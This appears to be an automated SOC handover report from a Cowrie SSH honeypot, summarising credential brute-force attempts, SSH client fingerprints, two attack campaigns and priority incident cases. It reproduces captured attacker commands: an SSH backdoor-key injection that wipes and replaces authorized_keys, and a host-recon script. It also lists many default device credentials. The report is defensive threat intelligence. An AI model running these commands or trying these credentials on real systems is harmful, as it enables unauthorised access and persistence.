# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-07-16 |
| **Generated At** | 2026-07-16T10:14:17Z |
| **Shift Time** | 10:14 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **368** |
| Confirmed Threats | **301** |
| False Positives Filtered | **67** (18.2%) |
| Unique Attacker IPs | **150** |
| Countries of Origin | **34** |
| High Severity Cases | **151** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **217** |
| Malware Samples Analyzed | **3** HIGH · **34** MED · 8 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **183** |
| Unique Credential Pairs | **91** |
| Unique Usernames | **29** |
| Unique Passwords | **85** |
| Successful Auth Pairs | **155** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 67 |
| `admin` | 25 |
| `support` | 19 |
| `test` | 11 |
| `ubnt` | 5 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `support` | 9 |
| `admin` | 9 |
| `1q2w3e` | 8 |
| `LeitboGi0ro` | 7 |
| `smo@@kkklss` | 6 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `support` | `support` | 9 |
| `root` | `LeitboGi0ro` | 7 |
| `root` | `smo@@kkklss` | 6 |
| `test` | `00` | 6 |
| `support` | `admin` | 6 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `!!Huawei` | `@HuaweiHgw` | `176.108.209.172` | 2026-07-16T04:56:10 |
| `root` | `openvpnas` | `125.23.255.134` | 2026-07-16T04:58:14 |
| `root` | `adminHW` | `176.108.209.172` | 2026-07-16T04:58:25 |
| `root` | `123` | `2.57.122.168` | 2026-07-16T05:00:09 |
| `root` | `zte` | `176.108.209.172` | 2026-07-16T05:01:04 |
| `root` | `1234` | `2.57.122.168` | 2026-07-16T05:02:46 |
| `support` | `support` | `176.53.159.196` | 2026-07-16T05:02:54 |
| `root` | `gpon` | `176.108.209.172` | 2026-07-16T05:03:21 |
| `support` | `support` | `10.0.0.73` | 2026-07-16T05:04:13 |
| `root` | `hg2x0` | `176.108.209.172` | 2026-07-16T05:05:41 |
| `root` | `12345` | `2.57.122.168` | 2026-07-16T05:06:03 |
| `cmcc` | `aDm8H%MdA` | `176.108.209.172` | 2026-07-16T05:08:20 |
| `support` | `support` | `176.108.209.172` | 2026-07-16T05:10:46 |
| `root` | `123.com` | `220.246.42.217` | 2026-07-16T05:11:17 |
| `root` | `123.com` | `50.217.40.11` | 2026-07-16T05:11:23 |
| `ubnt` | `ubnt` | `176.108.209.172` | 2026-07-16T05:13:01 |
| `root` | `1234567` | `2.57.122.168` | 2026-07-16T05:13:21 |
| `root` | `123.com` | `185.255.212.178` | 2026-07-16T05:14:47 |
| `root` | `123.com` | `36.135.62.103` | 2026-07-16T05:14:56 |
| `admin` | `h@32LuyD` | `176.108.209.172` | 2026-07-16T05:15:14 |
| `root` | `123@@@` | `158.178.141.210` | 2026-07-16T05:15:22 |
| `root` | `LeitboGi0ro` | `158.178.141.210` | 2026-07-16T05:15:23 |
| `root` | `12345678` | `2.57.122.168` | 2026-07-16T05:15:57 |
| `root` | `gw1admin` | `176.108.209.172` | 2026-07-16T05:17:52 |
| `root` | `123456789` | `2.57.122.168` | 2026-07-16T05:19:29 |
| `unknown` | `1q2w3e` | `43.248.213.232` | 2026-07-16T05:19:44 |
| `unknown` | `1q2w3e` | `210.177.143.61` | 2026-07-16T05:19:54 |
| `admin` | `gaokeAP` | `176.108.209.172` | 2026-07-16T05:20:12 |
| `admin` | `gaokeQ6` | `176.108.209.172` | 2026-07-16T05:22:26 |
| `root` | `1234567890` | `2.57.122.168` | 2026-07-16T05:22:47 |
| `unknown` | `1q2w3e` | `103.230.176.152` | 2026-07-16T05:23:14 |
| `unknown` | `1q2w3e` | `111.70.23.236` | 2026-07-16T05:23:23 |
| `keomeo` | `keomeo` | `176.108.209.172` | 2026-07-16T05:24:40 |
| `root` | `123abc` | `2.57.122.168` | 2026-07-16T05:25:42 |
| `fanxiazeng` | `fanxiazeng` | `185.242.3.195` | 2026-07-16T05:25:42 |
| `root` | `wuhanyatelan` | `176.108.209.172` | 2026-07-16T05:26:54 |
| `root` | `123@@@` | `64.110.90.250` | 2026-07-16T05:28:16 |
| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-07-16T05:28:17 |
| `root` | `1q2w3e4r` | `2.57.122.168` | 2026-07-16T05:28:23 |
| `cuadmin` | `cu@Hnunicom` | `176.108.209.172` | 2026-07-16T05:29:10 |
| `admin` | `Changeme_123` | `122.187.227.145` | 2026-07-16T05:29:42 |
| `root` | `plumeria0077` | `176.108.209.172` | 2026-07-16T05:31:51 |
| `root` | `123@@@` | `129.153.145.135` | 2026-07-16T05:32:44 |
| `root` | `LeitboGi0ro` | `129.153.145.135` | 2026-07-16T05:32:44 |
| `root` | `smo@@kkklss` | `129.153.145.135` | 2026-07-16T05:32:47 |
| `admin` | `Changeme_123` | `122.166.253.226` | 2026-07-16T05:33:03 |
| `master` | `master` | `116.181.19.147` | 2026-07-16T05:34:18 |
| `sjw10` | `sjw10` | `176.108.209.172` | 2026-07-16T05:34:31 |
| `root` | `123123123` | `20.46.45.121` | 2026-07-16T05:36:33 |
| `telecomadmin` | `nE7jA%5m` | `176.108.209.172` | 2026-07-16T05:37:11 |
| `fanxiazeng` | `fanxiazeng` | `10.0.0.73` | 2026-07-16T05:39:17 |
| `admin` | `96956` | `176.108.209.172` | 2026-07-16T05:39:51 |
| `root` | `123123123` | `183.89.208.174` | 2026-07-16T05:40:03 |
| `admin` | `gzcatvadmin` | `176.108.209.172` | 2026-07-16T05:42:31 |
| `admin` | `1234` | `176.108.209.172` | 2026-07-16T05:45:11 |
| `admin` | `password` | `176.108.209.172` | 2026-07-16T05:47:51 |
| `root` | `ADMINISTRATOR` | `103.61.122.229` | 2026-07-16T05:48:17 |
| `centos` | `11111111` | `218.21.243.58` | 2026-07-16T05:48:32 |
| `centos` | `11111111` | `10.0.0.73` | 2026-07-16T05:48:58 |
| `admin` | `7ujMko0admin` | `176.108.209.172` | 2026-07-16T05:50:30 |
| `admin` | `smcadmin` | `176.108.209.172` | 2026-07-16T05:53:10 |
| `test` | `00` | `210.245.95.11` | 2026-07-16T05:54:33 |
| `test` | `00` | `210.4.68.72` | 2026-07-16T05:54:46 |
| `admin` | `admin1234` | `176.108.209.172` | 2026-07-16T05:55:50 |
| `test` | `00` | `60.191.58.203` | 2026-07-16T05:58:04 |
| `test` | `00` | `178.178.222.57` | 2026-07-16T05:58:12 |
| `admin` | `1111` | `176.108.209.172` | 2026-07-16T05:58:29 |
| `test` | `00` | `10.0.0.73` | 2026-07-16T05:58:31 |
| `admin` | `54321` | `176.108.209.172` | 2026-07-16T06:01:09 |
| `support` | `7` | `222.190.110.210` | 2026-07-16T06:01:35 |
| `support` | `7` | `136.56.34.147` | 2026-07-16T06:01:48 |
| `admin` | `4321` | `176.108.209.172` | 2026-07-16T06:03:49 |
| `support` | `7` | `10.0.0.73` | 2026-07-16T06:05:28 |
| `admin` | `1111111` | `176.108.209.172` | 2026-07-16T06:06:28 |
| `admin` | `admin` | `10.0.0.73` | 2026-07-16T06:08:36 |
| `root` | `123@@@` | `144.22.238.238` | 2026-07-16T06:10:03 |
| `root` | `LeitboGi0ro` | `144.22.238.238` | 2026-07-16T06:10:03 |
| `root` | `smo@@kkklss` | `144.22.238.238` | 2026-07-16T06:10:11 |
| `admin` | `1995` | `10.0.0.73` | 2026-07-16T06:14:05 |
| `admin` | `admin` | `195.178.110.137` | 2026-07-16T06:14:38 |
| `root` | `Stefan20xxl21` | `185.242.3.195` | 2026-07-16T06:17:10 |
| `leo` | `leo` | `211.223.41.90` | 2026-07-16T06:19:41 |
| `leo` | `leo` | `49.124.149.50` | 2026-07-16T06:23:16 |
| `leo` | `leo` | `125.139.124.120` | 2026-07-16T06:23:30 |
| `root` | `Stefan20xxl21` | `10.0.0.73` | 2026-07-16T06:30:35 |
| `user` | `qwer1234` | `10.0.0.73` | 2026-07-16T06:30:42 |
| `admin` | `!QAZ2wsx` | `36.64.211.93` | 2026-07-16T06:39:02 |
| `admin` | `!QAZ2wsx` | `177.72.87.7` | 2026-07-16T06:39:16 |
| `ubuntu` | `ADMINISTRATOR` | `103.61.122.229` | 2026-07-16T06:47:12 |
| `testuser` | `test` | `45.178.227.0` | 2026-07-16T06:48:09 |
| `testuser` | `test` | `113.140.95.2` | 2026-07-16T06:48:23 |
| `testuser` | `test` | `10.0.0.73` | 2026-07-16T06:48:37 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `34.78.42.11` | 2026-07-16T06:49:45 |
| `*1` | `$4` | `34.78.42.11` | 2026-07-16T06:49:54 |
| `OPTIONS rtsp://example.com RTSP/1.0` | `Cseq: 2699` | `34.78.42.11` | 2026-07-16T06:49:56 |
| `ADMIN` | `ADMIN` | `203.123.219.137` | 2026-07-16T06:51:45 |
| `ADMIN` | `ADMIN` | `59.34.17.130` | 2026-07-16T06:51:55 |
| `ADMIN` | `ADMIN` | `10.0.0.73` | 2026-07-16T06:55:35 |
| `admin` | `asdf1234` | `10.0.0.73` | 2026-07-16T07:04:29 |
| `root` | `Root123` | `185.242.3.195` | 2026-07-16T07:08:10 |
| `test` | `6666` | `36.64.36.101` | 2026-07-16T07:09:53 |
| `test` | `6666` | `191.241.142.170` | 2026-07-16T07:13:22 |
| `test` | `6666` | `117.250.250.2` | 2026-07-16T07:13:30 |
| `test` | `6666` | `10.0.0.73` | 2026-07-16T07:13:49 |
| `root` | `987654321` | `83.239.0.202` | 2026-07-16T07:20:20 |
| `root` | `987654321` | `65.20.250.180` | 2026-07-16T07:20:27 |
| `root` | `987654321` | `10.0.0.73` | 2026-07-16T07:20:46 |
| `root` | `Root123` | `10.0.0.73` | 2026-07-16T07:21:32 |
| `info` | `password1` | `182.156.80.11` | 2026-07-16T07:25:41 |
| `info` | `password1` | `191.36.152.28` | 2026-07-16T07:25:50 |
| `root` | `ubuntu` | `176.170.1.244` | 2026-07-16T07:38:44 |
| `root` | `ubuntu` | `111.42.132.19` | 2026-07-16T07:38:51 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `35.195.153.185` | 2026-07-16T07:42:51 |
| `*1` | `$4` | `35.195.153.185` | 2026-07-16T07:43:04 |
| `OPTIONS rtsp://example.com RTSP/1.0` | `Cseq: 6411` | `35.195.153.185` | 2026-07-16T07:43:06 |
| `admin` | `manager` | `103.250.160.76` | 2026-07-16T07:45:28 |
| `root` | `adminroot` | `103.61.122.229` | 2026-07-16T07:46:23 |
| `root` | `root44` | `175.206.1.60` | 2026-07-16T07:50:58 |
| `root` | `qazqwe!#%&` | `185.242.3.195` | 2026-07-16T07:59:12 |
| `leo` | `leo123!` | `185.158.22.150` | 2026-07-16T08:00:05 |
| `345gs5662d34` | `345gs5662d34` | `185.158.22.150` | 2026-07-16T08:00:08 |
| `leo` | `3245gs5662d34` | `185.158.22.150` | 2026-07-16T08:00:09 |
| `Debian` | `admin123` | `222.236.155.146` | 2026-07-16T08:00:25 |
| `Debian` | `admin123` | `196.189.124.229` | 2026-07-16T08:03:54 |
| `root` | `﻿------fuck------` | `117.50.182.94` | 2026-07-16T08:04:05 |
| `Debian` | `admin123` | `211.169.212.206` | 2026-07-16T08:04:09 |
| `Debian` | `admin123` | `10.0.0.73` | 2026-07-16T08:04:14 |
| `root` | `rootserver` | `186.251.71.202` | 2026-07-16T08:04:55 |
| `345gs5662d34` | `345gs5662d34` | `186.251.71.202` | 2026-07-16T08:04:58 |
| `root` | `3245gs5662d34` | `186.251.71.202` | 2026-07-16T08:04:58 |
| `ubnt` | `5555555` | `103.251.143.14` | 2026-07-16T08:07:10 |
| `ubnt` | `5555555` | `103.83.23.169` | 2026-07-16T08:07:23 |
| `ubnt` | `5555555` | `60.220.241.50` | 2026-07-16T08:10:45 |
| `ubnt` | `5555555` | `87.225.108.138` | 2026-07-16T08:10:53 |
| `root` | `qazqwe!#%&` | `10.0.0.73` | 2026-07-16T08:12:48 |
| `root` | `1q2w3e` | `200.232.114.71` | 2026-07-16T08:25:37 |
| `root` | `1q2w3e` | `203.252.10.3` | 2026-07-16T08:25:46 |
| `root` | `1q2w3e` | `203.198.173.145` | 2026-07-16T08:29:04 |
| `root` | `1q2w3e` | `92.255.196.185` | 2026-07-16T08:29:11 |
| `support` | `admin` | `188.168.86.6` | 2026-07-16T08:32:17 |
| `support` | `admin` | `220.246.43.172` | 2026-07-16T08:32:27 |
| `support` | `admin` | `112.26.101.76` | 2026-07-16T08:35:52 |
| `support` | `admin` | `195.158.26.59` | 2026-07-16T08:36:04 |
| `support` | `admin` | `10.0.0.73` | 2026-07-16T08:36:20 |
| `john` | `john` | `60.172.54.36` | 2026-07-16T08:41:32 |
| `ubuntu` | `adminroot` | `103.61.122.229` | 2026-07-16T08:44:41 |
| `john` | `john` | `182.75.197.174` | 2026-07-16T08:45:08 |
| `john` | `john` | `49.124.149.50` | 2026-07-16T08:45:25 |
| `john` | `john` | `10.0.0.73` | 2026-07-16T08:45:27 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `34.79.58.59` | 2026-07-16T08:46:19 |
| `*1` | `$4` | `34.79.58.59` | 2026-07-16T08:46:32 |
| `OPTIONS rtsp://example.com RTSP/1.0` | `Cseq: 5653` | `34.79.58.59` | 2026-07-16T08:46:34 |
| `ps` | `1` | `185.242.3.195` | 2026-07-16T08:50:29 |
| `supervisor` | `supervisor1` | `93.4.16.74` | 2026-07-16T08:54:18 |
| `supervisor` | `supervisor1` | `10.0.0.73` | 2026-07-16T08:54:37 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **368** |
| Sessions with Fingerprint | **17** |
| Unique HASSH Fingerprints | **17** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| OpenSSH | 59 |
| Go SSH scanner | 36 |
| libssh | 24 |
| Paramiko (Python) | 18 |
| Unknown | 2 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `acaa53e0a7d7...` | Mirai/variant | 59 | 58 |
| `a2de0f306611...` | Mirai/variant | 14 | 3 |
| `16443846184e...` | Generic scanner | 13 | 2 |
| `2ec37a7cc8da...` | Mirai/variant | 10 | 1 |
| `eff4c24daffc...` | Modern SSH client | 4 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `acaa53e0a7d7...` | OpenSSH | 59 | 58 | Mirai/variant |
| `95420f9d932d...` | libssh | 16 | 7 | — |
| `a2de0f306611...` | Paramiko (Python) | 14 | 3 | Mirai/variant |
| `16443846184e...` | Go SSH scanner | 13 | 2 | Generic scanner |
| `2ec37a7cc8da...` | Go SSH scanner | 10 | 1 | Mirai/variant |
| `eff4c24daffc...` | Go SSH scanner | 4 | 1 | Modern SSH client |
| `6372ee695756...` | Paramiko (Python) | 4 | 1 | Modern SSH client |
| `f555226df196...` | libssh | 4 | 2 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **8** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Recon Loader Script** | 🟡 MEDIUM | 9 | 1 | `T1082, T1592, T1078, T1083` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 3 | 3 | `T1021.004, T1078, T1070, T1140` |

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `2.57.122.168`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `116.181.19.147`, `185.158.22.150`, `186.251.71.202`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **150** |
| Unique ASNs | **85** |
| High-Risk ASNs | **78** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS22773` | Cox Communications Inc. | 12 | MEDIUM |
| `AS4134` | CHINANET BACKBONE | 9 | HIGH |
| `AS46562` | Performive LLC | 7 | MEDIUM |
| `AS396982` | Google LLC | 7 | HIGH |
| `AS63949` | Akamai Connected Cloud | 5 | HIGH |
| `AS398324` | Censys, Inc. | 5 | HIGH |
| `AS9498` | BHARTI Airtel Ltd. | 5 | HIGH |
| `AS25369` | Hydra Communications Ltd | 4 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (122)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-d8bc91a25d95

| Field | Detail |
|---|---|
| **Source IP** | `125.23.255[.]134` |
| **First Seen** | 2026-07-16 04:58 |
| **Last Seen** | 2026-07-16 04:58 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 04:58:10` | `cowrie.session.connect` |
| `2026-07-16 04:58:11` | `cowrie.client.version` |
| `2026-07-16 04:58:11` | `cowrie.client.kex` |
| `2026-07-16 04:58:14` | `cowrie.login.success` |
| `2026-07-16 04:58:14` | `cowrie.direct-tcpip.request` |
| `2026-07-16 04:58:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.23.255[.]134` to AbuseIPDB if not already reported
- [ ] Block `125.23.255[.]134` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-51812575c090

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-07-16 05:00 |
| **Last Seen** | 2026-07-16 05:00 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 05:00:05` | `cowrie.session.connect` |
| `2026-07-16 05:00:06` | `cowrie.client.version` |
| `2026-07-16 05:00:06` | `cowrie.client.kex` |
| `2026-07-16 05:00:09` | `cowrie.login.success` |
| `2026-07-16 05:00:11` | `cowrie.session.params` |
| `2026-07-16 05:00:11` | `cowrie.command.input` |
| `2026-07-16 05:00:11` | `cowrie.command.input` |
| `2026-07-16 05:00:11` | `cowrie.command.input` |
| `2026-07-16 05:00:11` | `cowrie.command.input` |
| `2026-07-16 05:00:11` | `cowrie.command.input` |
| `2026-07-16 05:00:11` | `cowrie.command.success` |
| `2026-07-16 05:00:11` | `cowrie.command.input` |
| `2026-07-16 05:00:11` | `cowrie.command.input` |
| `2026-07-16 05:00:11` | `cowrie.command.input` |
| `2026-07-16 05:00:11` | `cowrie.command.input` |
| `2026-07-16 05:00:12` | `cowrie.log.closed` |
| `2026-07-16 05:00:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3a0dfbd9a3c6

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-07-16 05:02 |
| **Last Seen** | 2026-07-16 05:02 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 05:02:41` | `cowrie.session.connect` |
| `2026-07-16 05:02:42` | `cowrie.client.version` |
| `2026-07-16 05:02:42` | `cowrie.client.kex` |
| `2026-07-16 05:02:46` | `cowrie.login.success` |
| `2026-07-16 05:02:48` | `cowrie.session.params` |
| `2026-07-16 05:02:48` | `cowrie.command.input` |
| `2026-07-16 05:02:48` | `cowrie.command.input` |
| `2026-07-16 05:02:48` | `cowrie.command.input` |
| `2026-07-16 05:02:48` | `cowrie.command.input` |
| `2026-07-16 05:02:48` | `cowrie.command.input` |
| `2026-07-16 05:02:48` | `cowrie.command.success` |
| `2026-07-16 05:02:48` | `cowrie.command.input` |
| `2026-07-16 05:02:48` | `cowrie.command.input` |
| `2026-07-16 05:02:48` | `cowrie.command.input` |
| `2026-07-16 05:02:48` | `cowrie.command.input` |
| `2026-07-16 05:02:49` | `cowrie.log.closed` |
| `2026-07-16 05:02:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-46c4a6cea1ce

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-16 05:02 |
| **Last Seen** | 2026-07-16 05:02 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 05:02:54` | `cowrie.session.connect` |
| `2026-07-16 05:02:54` | `cowrie.client.version` |
| `2026-07-16 05:02:54` | `cowrie.client.kex` |
| `2026-07-16 05:02:54` | `cowrie.login.success` |
| `2026-07-16 05:02:54` | `cowrie.direct-tcpip.request` |
| `2026-07-16 05:02:54` | `cowrie.direct-tcpip.data` |
| `2026-07-16 05:02:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-493eafa1e0a7

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-07-16 05:05 |
| **Last Seen** | 2026-07-16 05:06 |
| **Session Duration** | 20s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 05:05:52` | `cowrie.session.connect` |
| `2026-07-16 05:05:54` | `cowrie.client.version` |
| `2026-07-16 05:05:54` | `cowrie.client.kex` |
| `2026-07-16 05:06:03` | `cowrie.login.success` |
| `2026-07-16 05:06:07` | `cowrie.session.params` |
| `2026-07-16 05:06:07` | `cowrie.command.input` |
| `2026-07-16 05:06:07` | `cowrie.command.input` |
| `2026-07-16 05:06:07` | `cowrie.command.input` |
| `2026-07-16 05:06:07` | `cowrie.command.input` |
| `2026-07-16 05:06:07` | `cowrie.command.input` |
| `2026-07-16 05:06:07` | `cowrie.command.success` |
| `2026-07-16 05:06:07` | `cowrie.command.input` |
| `2026-07-16 05:06:07` | `cowrie.command.input` |
| `2026-07-16 05:06:07` | `cowrie.command.input` |
| `2026-07-16 05:06:07` | `cowrie.command.input` |
| `2026-07-16 05:06:10` | `cowrie.log.closed` |
| `2026-07-16 05:06:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8230c2347314

| Field | Detail |
|---|---|
| **Source IP** | `220.246.42[.]217` |
| **First Seen** | 2026-07-16 05:11 |
| **Last Seen** | 2026-07-16 05:11 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 05:11:14` | `cowrie.session.connect` |
| `2026-07-16 05:11:15` | `cowrie.client.version` |
| `2026-07-16 05:11:15` | `cowrie.client.kex` |
| `2026-07-16 05:11:17` | `cowrie.login.success` |
| `2026-07-16 05:11:17` | `cowrie.direct-tcpip.request` |
| `2026-07-16 05:11:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.246.42[.]217` to AbuseIPDB if not already reported
- [ ] Block `220.246.42[.]217` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
